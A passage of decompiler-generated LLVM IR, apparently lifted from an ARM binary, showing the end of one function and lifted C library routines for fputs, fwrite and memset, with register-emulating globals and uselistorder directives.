  store i32 %v1_15780, i32* %r3.global-to-local, align 4
  %v6_15788 = icmp slt i32 %v1_1577c, %v1_15780
  br i1 %v6_15788, label %dec_label_pc_156f0, label %dec_label_pc_157ac

dec_label_pc_15790:                               ; preds = %dec_label_pc_156e4
  %v0_15790 = load i32, i32* %r7.global-to-local, align 4
  %v1_15790 = add i32 %v0_15790, 28
  %v2_15790 = inttoptr i32 %v1_15790 to i32*
  %v3_15790 = load i32, i32* %v2_15790, align 4
  store i32 %v3_15790, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_15798 = add i32 %v0_15790, 38
  %v4_15798 = inttoptr i32 %v3_15798 to i8*
  store i8 1, i8* %v4_15798, align 1
  %v0_1579c = load i32, i32* %r2.global-to-local, align 4
  %v3_1579c = mul i32 %v0_1579c, 4
  store i32 %v3_1579c, i32* @r2, align 4
  %v0_157a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_157a0 = add i32 %v0_157a0, 40
  store i32 %v1_157a0, i32* @r0, align 4
  %v2_157a4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_157a4, i32* @r1, align 4
  %v0_157a8 = call i32 @memcpy()
  store i32 %v0_157a8, i32* %r0.global-to-local, align 4
  %v0_157ac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_157ac

dec_label_pc_157ac:                               ; preds = %dec_label_pc_15778, %dec_label_pc_15790
  %v2_157c8 = phi i32 [ %v0_157ac.pre, %dec_label_pc_15790 ], [ %v0_15778, %dec_label_pc_15778 ]
  %v1_157ac = add i32 %v2_157c8, 16
  %v2_157ac = inttoptr i32 %v1_157ac to i32*
  %v3_157ac = load i32, i32* %v2_157ac, align 4
  store i32 %v3_157ac, i32* %r3.global-to-local, align 4
  %v1_157b0 = and i32 %v3_157ac, 128
  %v2_157b0 = icmp eq i32 %v1_157b0, 0
  br i1 %v2_157b0, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_157ac
  %v3_157b4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_157b4, i32* %r3.global-to-local, align 4
  %v2_157b8 = inttoptr i32 %v2_157c8 to i32*
  %v3_157b8 = load i32, i32* %v2_157b8, align 4
  %v2_157c0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_157c0 = sub i32 %v2_157c0.pre, %v3_157b4
  store i32 %v3_157c0, i32* %r3.global-to-local, align 4
  %v5_157c4 = mul i32 %v3_157c0, 4
  %v6_157c4 = add i32 %v5_157c4, %v3_157b8
  store i32 %v6_157c4, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_157ac
  %v1_157bc45 = load i32, i32* %r6.global-to-local, align 4
  %v2_157bc46 = add i32 %v1_157bc45, 1
  store i32 %v2_157bc46, i32* %r3.global-to-local, align 4
  %v3_157c8 = inttoptr i32 %v2_157c8 to i32*
  store i32 %v2_157bc46, i32* %v3_157c8, align 4
  %v0_157cc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_157d4 = phi i32 [ %v2_157c8, %.thread48 ], [ %v0_157cc.pre, %.thread50 ]
  %v1_157cc = add i32 %v1_157d4, 28
  %v2_157cc = inttoptr i32 %v1_157cc to i32*
  %v3_157cc = load i32, i32* %v2_157cc, align 4
  store i32 %v3_157cc, i32* %r3.global-to-local, align 4
  %v1_157d0 = add i32 %v3_157cc, 2
  store i32 %v1_157d0, i32* %r0.global-to-local, align 4
  %v0_157d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_157d4 = add i32 %v1_157d4, 24
  %v3_157d4 = inttoptr i32 %v2_157d4 to i32*
  store i32 %v0_157d4, i32* %v3_157d4, align 4
  br i1 %v2_157b0, label %dec_label_pc_157e4, label %bb161

bb161:                                            ; preds = %bb160
  %v1_157d8 = load i32, i32* @r2, align 4
  %v2_157d8 = load i32, i32* %r7.global-to-local, align 4
  %v3_157d8 = inttoptr i32 %v2_157d8 to i32*
  store i32 %v1_157d8, i32* %v3_157d8, align 4
  br label %dec_label_pc_157e4

dec_label_pc_157e0:                               ; preds = %dec_label_pc_156d4, %dec_label_pc_152f4, %dec_label_pc_1543c, %dec_label_pc_154e8, %dec_label_pc_154c0, %dec_label_pc_154cc, %dec_label_pc_15408, %dec_label_pc_15720, %dec_label_pc_156a0, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_157e4

dec_label_pc_157e4:                               ; preds = %bb161, %bb160, %dec_label_pc_157e0
  %v2_157e8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_157e8, i32* @r4, align 4
  store i32 %v6_152b0, i32* @r5, align 4
  store i32 %v27_152b0, i32* @lr, align 4
  %v1_157ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_157ec

; uselistorder directives
  uselistorder i32 %v3_157c0, { 1, 0 }
  uselistorder i32 %v1_1577c, { 1, 2, 0 }
  uselistorder i32 %v2_15718, { 1, 0 }
  uselistorder i32 %v1_15718, { 1, 0, 2 }
  uselistorder i32 %v0_15738, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_15710, { 0, 2, 1, 3 }
  uselistorder i32 %v1_156d4, { 1, 2, 0 }
  uselistorder i32 %v0_156c4, { 1, 0 }
  uselistorder i32 %v1_156a0, { 1, 0, 2 }
  uselistorder i32 %v1_15614, { 1, 2, 0 }
  uselistorder i32 %v1_155fc, { 1, 0 }
  uselistorder i32 %v2_155e4, { 2, 1, 0 }
  uselistorder i32 %v1_155c8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_155c0, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_155a4, { 1, 0, 2 }
  uselistorder i32 %v2_1558c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15580, { 2, 1, 0 }
  uselistorder i32 %v1_15540, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15530.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1550c, { 1, 0 }
  uselistorder i32 %v5_1546c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1546c, { 1, 0 }
  uselistorder i32 %v0_1547076, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_15414, { 1, 0 }
  uselistorder i32 %v0_15434, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_153f8, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_153e0, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_153d0, { 1, 0 }
  uselistorder i32 %v3_153c8, { 0, 2, 1 }
  uselistorder i8 %v2_153c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15448, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_1538c, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15378, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15360, { 1, 0 }
  uselistorder i32 %v3_1536c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_15314, { 0, 2, 1 }
  uselistorder i32 %v2_15300, { 1, 0, 2 }
  uselistorder i32 %v0_152b4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 1, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 10, 9, 13, 12, 2, 3, 11, 4, 14, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 2, 0, 1 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i32 -37096, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_157e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157e0, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_157ac, { 1, 0 }
  uselistorder label %dec_label_pc_15778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15770, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1572c, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_156e4, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154f8, { 1, 0 }
  uselistorder label %dec_label_pc_154ac, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_15428, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15424, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_153c4, { 1, 0 }
  uselistorder label %dec_label_pc_153c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15364, { 1, 0 }
  uselistorder label %dec_label_pc_15338, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15820 = load i32, i32* @r4, align 4
  store i32 %v3_15820, i32* %stack_var_-16, align 4
  %v6_15820 = load i32, i32* @r5, align 4
  %v9_15820 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1582c = call i32 @strlen(i8* %arg1)
  store i32 %v3_1582c, i32* @r6, align 4
  %v0_15834 = load i32, i32* @r5, align 4
  %v0_15838 = load i32, i32* @r4, align 4
  %v5_15844 = inttoptr i32 %v0_15834 to i16*
  %v6_15844 = call i32 @__GI_fwrite_unlocked(i32 %v0_15838, i32 1, i32 %v3_1582c, i16* %v5_15844)
  %v1_15848 = load i32, i32* @r6, align 4
  %v9_15848 = icmp eq i32 %v6_15844, %v1_15848
  br i1 %v9_15848, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_15854 = phi i32 [ %v6_15844, %entry ], [ -1, %bb ]
  %v2_15850 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15850, i32* @r4, align 4
  store i32 %v6_15820, i32* @r5, align 4
  store i32 %v9_15820, i32* @r6, align 4
  ret i32 %v1_15854

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_15858 = load i32, i32* @r6, align 4
  %v12_15858 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_15860 = load i16, i16* %arg4, align 2
  %v1_15864 = and i16 %v3_15860, 192
  %v2_15868 = icmp eq i16 %v1_15864, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15868, label %dec_label_pc_15894, label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %entry
  %v4_15888 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_1588c = icmp eq i32 %v4_15888, 0
  br i1 %v2_1588c, label %dec_label_pc_15894thread-pre-split, label %dec_label_pc_158f4

dec_label_pc_15894thread-pre-split:               ; preds = %dec_label_pc_15880
  %v0_15894.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_15894

dec_label_pc_15894:                               ; preds = %dec_label_pc_15894thread-pre-split, %entry
  %v0_158b8 = phi i32 [ %v0_15894.pr, %dec_label_pc_15894thread-pre-split ], [ %arg2, %entry ]
  %v2_15894 = icmp eq i32 %v0_158b8, 0
  br i1 %v2_15894, label %dec_label_pc_158f4, label %bb

bb:                                               ; preds = %dec_label_pc_15894
  %v1_15898 = load i32, i32* @r6, align 4
  %v3_15898 = icmp eq i32 %v1_15898, 0
  br i1 %v3_15898, label %dec_label_pc_158f4, label %dec_label_pc_158a0

dec_label_pc_158a0:                               ; preds = %bb
  %v2_158a8 = udiv i32 -1, %v0_158b8
  %tmp9 = icmp ugt i32 %v1_15898, %v2_158a8
  %v0_158d4 = load i32, i32* @r5, align 4
  %v1_158d4 = inttoptr i32 %v0_158d4 to i16*
  br i1 %tmp9, label %dec_label_pc_158d4, label %dec_label_pc_158b4

dec_label_pc_158b4:                               ; preds = %dec_label_pc_158a0
  store i32 %v0_158d4, i32* %r2.global-to-local, align 4
  %v2_158b8 = mul i32 %v1_15898, %v0_158b8
  %v0_158bc = load i32, i32* @r7, align 4
  %v5_158c0 = call i32 @__stdio_fwrite(i32 %v0_158bc, i32 %v2_158b8, i16* %v1_158d4)
  %v0_158c4 = load i32, i32* @r4, align 4
  %v2_158c8 = udiv i32 %v5_158c0, %v0_158c4
  store i32 %v2_158c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_158f8

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158a0
  %v2_158d4 = load i16, i16* %v1_158d4, align 2
  %v1_158d8 = or i16 %v2_158d4, 8
  store i16 %v1_158d8, i16* %v1_158d4, align 2
  %v0_158e0 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_158ec = inttoptr i32 %v0_158e0 to i32*
  store i32 22, i32* %v2_158ec, align 4
  %v0_158f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_158f8

dec_label_pc_158f4:                               ; preds = %dec_label_pc_15894, %dec_label_pc_15880, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_158f8

dec_label_pc_158f8:                               ; preds = %dec_label_pc_158d4, %dec_label_pc_158b4, %dec_label_pc_158f4
  %v0_158f8 = phi i32 [ %v0_158f8.pre, %dec_label_pc_158d4 ], [ %v2_158c8, %dec_label_pc_158b4 ], [ 0, %dec_label_pc_158f4 ]
  store i32 %v9_15858, i32* @r6, align 4
  store i32 %v12_15858, i32* @r7, align 4
  ret i32 %v0_158f8

; uselistorder directives
  uselistorder i16* %v1_158d4, { 0, 2, 1 }
  uselistorder i32 %v1_15898, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_158f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158f4, { 2, 0, 1 }
}

define i32 @function_15908(i32 %arg1) local_unnamed_addr {
dec_label_pc_15908:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_15914 = load i32, i32* @r2, align 4
  %v8_15914 = icmp eq i32 %v0_15914, 8
  store i1 %v8_15914, i1* %cpsr_z.global-to-local, align 1
  %v5_15918 = icmp slt i32 %v0_15914, 8
  br i1 %v5_15918, label %dec_label_pc_15978, label %dec_label_pc_1591c

dec_label_pc_1591c:                               ; preds = %entry
  %v4_1591c = mul i32 %arg2, 256
  %v5_1591c = or i32 %v4_1591c, %arg2
  %v4_15920 = mul i32 %v5_1591c, 65536
  %v5_15920 = or i32 %v4_15920, %v5_1591c
  store i32 %v5_15920, i32* %r1.global-to-local, align 4
  %v1_1592457 = urem i32 %tmp, 4
  %v2_1592458 = icmp eq i32 %v1_1592457, 0
  store i1 %v2_1592458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1592458, label %dec_label_pc_15934, label %bb

bb:                                               ; preds = %dec_label_pc_1591c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1591c ]
  %v3_1592859 = phi i32 [ %v6_15928, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1591c ]
  %v4_15928 = inttoptr i32 %v3_1592859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15928, align 1
  %v5_15928 = load i32, i32* @r3, align 4
  %v6_15928 = add i32 %v5_15928, 1
  store i32 %v6_15928, i32* @r3, align 4
  %v0_1592c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15938.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1592c.pr, label %dec_label_pc_15934, label %.thread

.thread:                                          ; preds = %bb
  %v2_1592c = add i32 %v0_15938.pr.pre, -1
  store i32 %v2_1592c, i32* @r2, align 4
  %v1_15924 = urem i32 %v6_15928, 4
  %v2_15924 = icmp eq i32 %v1_15924, 0
  store i1 %v2_15924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15924, label %dec_label_pc_15934, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15928.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_15928.pre to i8
  br label %bb

dec_label_pc_15934:                               ; preds = %.thread, %bb, %dec_label_pc_1591c
  %v0_1594028 = phi i32 [ %tmp, %dec_label_pc_1591c ], [ %v6_15928, %bb ], [ %v6_15928, %.thread ]
  %v0_15938.pr = phi i32 [ %v0_15914, %dec_label_pc_1591c ], [ %v0_15938.pr.pre, %bb ], [ %v2_1592c, %.thread ]
  %v0_15934 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15934, i32* @ip, align 4
  %v8_1593810 = icmp eq i32 %v0_15938.pr, 8
  store i1 %v8_1593810, i1* %cpsr_z.global-to-local, align 1
  %v5_1593c11 = icmp slt i32 %v0_15938.pr, 8
  br i1 %v5_1593c11, label %dec_label_pc_15978, label %dec_label_pc_15940.preheader

dec_label_pc_15940.preheader:                     ; preds = %dec_label_pc_15934
  %v1_1594046 = inttoptr i32 %v0_1594028 to i32*
  store i32 %v0_15934, i32* %v1_1594046, align 4
  %v3_1594047 = add i32 %v0_1594028, 4
  %v4_1594048 = inttoptr i32 %v3_1594047 to i32*
  %v5_1594049 = load i32, i32* @ip, align 4
  store i32 %v5_1594049, i32* %v4_1594048, align 4
  %v6_1594050 = add i32 %v0_1594028, 8
  store i32 %v6_1594050, i32* @r3, align 4
  %v0_1594451 = load i32, i32* @r2, align 4
  %v1_1594452 = add i32 %v0_1594451, -8
  store i32 %v1_1594452, i32* @r2, align 4
  %v5_1594c53 = icmp slt i32 %v1_1594452, 8
  br i1 %v5_1594c53, label %dec_label_pc_15940.dec_label_pc_15978.loopexit_crit_edge, label %dec_label_pc_15950

dec_label_pc_15950:                               ; preds = %dec_label_pc_15940.preheader, %dec_label_pc_15938.dec_label_pc_15940_crit_edge
  %v6_1594055 = phi i32 [ %v6_15940, %dec_label_pc_15938.dec_label_pc_15940_crit_edge ], [ %v6_1594050, %dec_label_pc_15940.preheader ]
  %v0_1594054 = phi i32 [ %v12_1596c, %dec_label_pc_15938.dec_label_pc_15940_crit_edge ], [ %v0_1594028, %dec_label_pc_15940.preheader ]
  %v1_15950 = inttoptr i32 %v6_1594055 to i32*
  %v2_15950 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15950, i32* %v1_15950, align 4
  %v3_15950 = add i32 %v0_1594054, 12
  %v4_15950 = inttoptr i32 %v3_15950 to i32*
  %v5_15950 = load i32, i32* @ip, align 4
  store i32 %v5_15950, i32* %v4_15950, align 4
  %v6_15950 = add i32 %v0_1594054, 16
  store i32 %v6_15950, i32* @r3, align 4
  %v0_15954 = load i32, i32* @r2, align 4
  %v1_15954 = add i32 %v0_15954, -8
  store i32 %v1_15954, i32* @r2, align 4
  %v5_1595c = icmp slt i32 %v1_15954, 8
  br i1 %v5_1595c, label %dec_label_pc_15950.dec_label_pc_15978.loopexit_crit_edge, label %dec_label_pc_15960

dec_label_pc_15960:                               ; preds = %dec_label_pc_15950
  %v1_15960 = inttoptr i32 %v6_15950 to i32*
  %v2_15960 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15960, i32* %v1_15960, align 4
  %v3_15960 = add i32 %v0_1594054, 20
  %v4_15960 = inttoptr i32 %v3_15960 to i32*
  %v5_15960 = load i32, i32* @ip, align 4
  store i32 %v5_15960, i32* %v4_15960, align 4
  %v6_15960 = add i32 %v0_1594054, 24
  store i32 %v6_15960, i32* @r3, align 4
  %v0_15964 = load i32, i32* @r2, align 4
  %v1_15964 = add i32 %v0_15964, -8
  store i32 %v1_15964, i32* @r2, align 4
  %v5_1596c = icmp slt i32 %v1_15964, 8
  br i1 %v5_1596c, label %dec_label_pc_15960.dec_label_pc_15978.loopexit_crit_edge, label %dec_label_pc_15938

dec_label_pc_15938:                               ; preds = %dec_label_pc_15960
  %v7_1596c = inttoptr i32 %v6_15960 to i32*
  %v8_1596c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1596c, i32* %v7_1596c, align 4
  %v9_1596c = add i32 %v0_1594054, 28
  %v10_1596c = inttoptr i32 %v9_1596c to i32*
  %v11_1596c = load i32, i32* @ip, align 4
  store i32 %v11_1596c, i32* %v10_1596c, align 4
  %v12_1596c = add i32 %v0_1594054, 32
  store i32 %v12_1596c, i32* @r3, align 4
  %v6_15970 = load i32, i32* @r2, align 4
  %v7_15970 = add i32 %v6_15970, -8
  store i32 %v7_15970, i32* @r2, align 4
  %v5_1593c = icmp slt i32 %v7_15970, 8
  br i1 %v5_1593c, label %dec_label_pc_15938.dec_label_pc_15978.loopexit_crit_edge, label %dec_label_pc_15938.dec_label_pc_15940_crit_edge

dec_label_pc_15938.dec_label_pc_15940_crit_edge:  ; preds = %dec_label_pc_15938
  %v2_15940.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15940 = inttoptr i32 %v12_1596c to i32*
  store i32 %v2_15940.pre, i32* %v1_15940, align 4
  %v3_15940 = add i32 %v0_1594054, 36
  %v4_15940 = inttoptr i32 %v3_15940 to i32*
  %v5_15940 = load i32, i32* @ip, align 4
  store i32 %v5_15940, i32* %v4_15940, align 4
  %v6_15940 = add i32 %v0_1594054, 40
  store i32 %v6_15940, i32* @r3, align 4
  %v0_15944 = load i32, i32* @r2, align 4
  %v1_15944 = add i32 %v0_15944, -8
  store i32 %v1_15944, i32* @r2, align 4
  %v5_1594c = icmp slt i32 %v1_15944, 8
  br i1 %v5_1594c, label %dec_label_pc_15940.dec_label_pc_15978.loopexit_crit_edge, label %dec_label_pc_15950

dec_label_pc_15938.dec_label_pc_15978.loopexit_crit_edge: ; preds = %dec_label_pc_15938
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15978

dec_label_pc_15940.dec_label_pc_15978.loopexit_crit_edge: ; preds = %dec_label_pc_15938.dec_label_pc_15940_crit_edge, %dec_label_pc_15940.preheader
  %v1_15944.lcssa = phi i32 [ %v1_1594452, %dec_label_pc_15940.preheader ], [ %v1_15944, %dec_label_pc_15938.dec_label_pc_15940_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15978

dec_label_pc_15950.dec_label_pc_15978.loopexit_crit_edge: ; preds = %dec_label_pc_15950
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15978

dec_label_pc_15960.dec_label_pc_15978.loopexit_crit_edge: ; preds = %dec_label_pc_15960
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_15934, %dec_label_pc_15938.dec_label_pc_15978.loopexit_crit_edge, %dec_label_pc_15940.dec_label_pc_15978.loopexit_crit_edge, %dec_label_pc_15950.dec_label_pc_15978.loopexit_crit_edge, %dec_label_pc_15960.dec_label_pc_15978.loopexit_crit_edge, %entry
  %v0_15980 = phi i32 [ %v0_15914, %entry ], [ %v1_15964, %dec_label_pc_15960.dec_label_pc_15978.loopexit_crit_edge ], [ %v1_15954, %dec_label_pc_15950.dec_label_pc_15978.loopexit_crit_edge ], [ %v1_15944.lcssa, %dec_label_pc_15940.dec_label_pc_15978.loopexit_crit_edge ], [ %v7_15970, %dec_label_pc_15938.dec_label_pc_15978.loopexit_crit_edge ], [ %v0_15938.pr, %dec_label_pc_15934 ]
  %v2_15978 = icmp eq i32 %v0_15980, 0
  store i1 %v2_15978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15978, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15978
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15978
  %v1_15980 = sub i32 7, %v0_15980
  store i32 %v1_15980, i32* @r2, align 4
  %v3_15984 = mul i32 %v1_15980, 4
  %v4_15984 = add i32 %v3_15984, ptrtoint (i32* @global_var_1598c.922 to i32)
  call void @__pseudo_branch(i32 %v4_15984)
  %v0_1598c = load i32, i32* %r1.global-to-local, align 4
  %v1_1598c = trunc i32 %v0_1598c to i8
  %v2_1598c = load i32, i32* @r3, align 4
  %v3_1598c = inttoptr i32 %v2_1598c to i8*
  store i8 %v1_1598c, i8* %v3_1598c, align 1
  %v4_1598c = load i32, i32* @r3, align 4
  %v5_1598c = add i32 %v4_1598c, 1
  store i32 %v5_1598c, i32* %r3.global-to-local, align 4
  %v0_15990 = load i32, i32* %r1.global-to-local, align 4
  %v1_15990 = trunc i32 %v0_15990 to i8
  %v3_15990 = inttoptr i32 %v5_1598c to i8*
  store i8 %v1_15990, i8* %v3_15990, align 1
  %v4_15990 = load i32, i32* %r3.global-to-local, align 4
  %v5_15990 = add i32 %v4_15990, 1
  store i32 %v5_15990, i32* %r3.global-to-local, align 4
  %v0_15994 = load i32, i32* %r1.global-to-local, align 4
  %v1_15994 = trunc i32 %v0_15994 to i8
  %v3_15994 = inttoptr i32 %v5_15990 to i8*
  store i8 %v1_15994, i8* %v3_15994, align 1
  %v4_15994 = load i32, i32* %r3.global-to-local, align 4
  %v5_15994 = add i32 %v4_15994, 1
  store i32 %v5_15994, i32* %r3.global-to-local, align 4
  %v0_15998 = load i32, i32* %r1.global-to-local, align 4
  %v1_15998 = trunc i32 %v0_15998 to i8
  %v3_15998 = inttoptr i32 %v5_15994 to i8*
  store i8 %v1_15998, i8* %v3_15998, align 1
  %v4_15998 = load i32, i32* %r3.global-to-local, align 4
  %v5_15998 = add i32 %v4_15998, 1
  store i32 %v5_15998, i32* %r3.global-to-local, align 4
  %v0_1599c = load i32, i32* %r1.global-to-local, align 4
  %v1_1599c = trunc i32 %v0_1599c to i8
  %v3_1599c = inttoptr i32 %v5_15998 to i8*
  store i8 %v1_1599c, i8* %v3_1599c, align 1
  %v4_1599c = load i32, i32* %r3.global-to-local, align 4
  %v5_1599c = add i32 %v4_1599c, 1
  store i32 %v5_1599c, i32* %r3.global-to-local, align 4
  %v0_159a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_159a0 = trunc i32 %v0_159a0 to i8
  %v3_159a0 = inttoptr i32 %v5_1599c to i8*
  store i8 %v1_159a0, i8* %v3_159a0, align 1
  %v4_159a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_159a0 = add i32 %v4_159a0, 1
  store i32 %v5_159a0, i32* %r3.global-to-local, align 4
  %v0_159a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_159a4 = trunc i32 %v0_159a4 to i8
  %v3_159a4 = inttoptr i32 %v5_159a0 to i8*
  store i8 %v1_159a4, i8* %v3_159a4, align 1
  %v4_159a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_159a4 = add i32 %v4_159a4, 1
  store i32 %v5_159a4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15940, { 1, 0 }
  uselistorder i32 %v12_1596c, { 1, 2, 0 }
